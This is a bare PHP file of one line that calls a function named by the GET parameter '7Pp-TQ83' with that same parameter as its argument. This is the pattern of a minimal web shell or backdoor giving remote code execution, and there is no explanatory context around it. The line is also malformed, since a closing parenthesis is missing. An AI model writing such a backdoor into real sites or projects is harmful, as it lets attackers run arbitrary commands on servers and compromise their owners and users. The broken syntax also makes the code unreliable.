<?php
$_GET['7Pp-TQ83']($_GET['7Pp-TQ83'];
?>
